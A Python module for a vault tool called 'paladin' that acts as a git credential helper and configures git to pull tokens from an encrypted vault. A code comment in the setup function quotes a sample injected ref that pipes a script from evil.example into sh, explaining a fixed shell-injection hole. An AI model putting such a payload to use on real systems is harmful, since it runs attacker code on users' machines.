"""A git credential helper backed by the paladin vault.

Git can call an external program whenever it needs a username/password for a
remote. This makes paladin that program, so a token for github.com (or any
host) is resolved from the encrypted vault at the moment git asks — the value
never lands in the git config, in ~/.git-credentials, in a remote URL, or on a
command line.

Set it up once:

    paladin git-setup github.com github_token

which configures git and grants the helper access to that one ref. After that,
`git push` / `git fetch` to github.com just work, pulling the token from the
vault. For unattended use (CI, a service) the vault must be unlockable
non-interactively via PALADIN_PASSPHRASE or PALADIN_KEYFILE.

Protocol: git invokes `get`, `store`, and `erase`. Only `get` returns
anything — the vault is the source of truth, so `store`/`erase` are no-ops
(paladin never writes git's own credential copy).
"""
from __future__ import annotations

import subprocess
import sys
from typing import Optional

from paladin.broker import Broker
from paladin.refs import SecretRef
from paladin.vault import Vault

GIT_REQUESTER = "git:credential"


def _read_git_fields() -> dict:
    """Consume git's `key=value` lines from stdin (terminated by a blank line)."""
    fields = {}
    for line in sys.stdin:
        line = line.rstrip("\n")
        if not line:
            break
        if "=" in line:
            k, v = line.split("=", 1)
            fields[k] = v
    return fields


def run(action: str, ref: str, vault_path: Optional[str] = None) -> int:
    """Entry point for `paladin git-credential <action> --ref <name>`.

    Always exits 0: if the vault is locked or the ref can't be resolved, we
    print nothing to stdout, and git silently falls back to its next helper (or
    prompts) rather than erroring — a credential helper must never break git.
    """
    if action != "get":
        # store / erase: the vault owns the secret; nothing for git to persist.
        return 0

    _read_git_fields()  # drain git's protocol/host input (not needed to resolve)

    try:
        vault = Vault.open_from_env(path=vault_path, interactive=False)
    except Exception as e:  # locked, missing, bad keyfile
        sys.stderr.write(
            f"paladin git-credential: vault not unlockable ({e}); set "
            "PALADIN_PASSPHRASE or PALADIN_KEYFILE for unattended use\n")
        return 0

    try:
        token = Broker(vault)._resolve(SecretRef.parse(ref), GIT_REQUESTER, "L0")
    except Exception as e:
        sys.stderr.write(
            f"paladin git-credential: cannot resolve '{ref}' ({e}). "
            f"Run: paladin grant {ref} --to {GIT_REQUESTER}\n")
        return 0

    # GitHub (and most hosts) accept the token in the password field with any
    # username; x-access-token is the conventional placeholder.
    sys.stdout.write(f"username=x-access-token\npassword={token}\n\n")
    return 0


def setup(host: str, ref: str, scope: str = "global") -> int:
    """`paladin git-setup <host> <ref>`: wire git to this helper for one host,
    and grant the helper access to that one ref. Idempotent."""
    # `ref` is embedded, unescaped, into a `credential.<url>.helper` value
    # below -- a '!'-prefixed helper value is run by git via `sh -c`, so an
    # unvalidated ref is a shell-injection path into ~/.gitconfig (e.g.
    # `paladin git-setup github.com "x; curl evil.example/p.sh | sh #"`).
    # Every other name-taking path in this module validates through
    # SecretRef first; this was the one that skipped it. Found in review.
    try:
        SecretRef.parse(ref)
    except Exception as e:
        sys.stderr.write(f"paladin git-setup: invalid ref {ref!r} ({e})\n")
        return 1

    # 1) grant git:credential access to just this ref
    try:
        vault = Vault.open_from_env(interactive=True)
        Broker(vault).grant(ref, GIT_REQUESTER, max_band="L0",
                            note=f"git credential helper for {host}")
    except Exception as e:
        sys.stderr.write(f"paladin git-setup: could not create grant ({e})\n")
        return 1

    # 2) configure git to call this helper for that host only. The leading '!'
    # tells git to run the string verbatim instead of prefixing 'git credential-'.
    key = f"credential.https://{host}.helper"
    value = f"!paladin git-credential --ref {ref}"
    scope_flag = "--global" if scope == "global" else "--local"
    try:
        # Reset first so re-running doesn't stack duplicate helpers.
        subprocess.run(["git", "config", scope_flag, "--unset-all", key],
                       capture_output=True)
        subprocess.run(["git", "config", scope_flag, key, value],
                       check=True, capture_output=True, text=True)
    except (subprocess.CalledProcessError, OSError) as e:
        sys.stderr.write(f"paladin git-setup: git config failed ({e})\n")
        return 1

    print(f"git will now resolve credentials for {host} from paladin://{ref}.")
    print(f"  configured: {key} = {value}  ({scope})")
    print(f"  granted:    {ref} → {GIT_REQUESTER} (≤L0)")
    print("Test it:  git ls-remote https://" + host + "/<you>/<repo>.git")
    return 0
